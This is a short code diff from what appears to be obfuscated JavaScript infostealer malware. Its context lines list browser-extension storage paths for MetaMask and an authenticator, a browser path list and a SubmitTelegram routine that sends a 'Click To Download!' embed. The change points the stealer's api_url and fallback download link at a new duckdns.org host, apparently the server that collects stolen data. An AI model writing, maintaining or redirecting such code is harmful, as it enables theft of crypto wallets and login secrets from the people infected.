@@ -155,7 +155,7 @@ _0x4ae424.Authenticator_E =
     '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
 _0x4ae424.MetaMask_O =
     '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
-const api_url = "https://xortoproject.online";
+const api_url = "http://xortoproject.duckdns.org";
 
 const extension = _0x4ae424,
   browserPath = [
@@ -1916,7 +1916,7 @@ async function SubmitTelegram() {
             embeds: [
                 {
                     title: "Click To Download!",
-                    url: responseData.downloadPage || 'https://xortoproject.online',
+                    url: responseData.downloadPage || 'http://xortoproject.duckdns.org',
                     color: 3553599,
                     fields: [
                         {
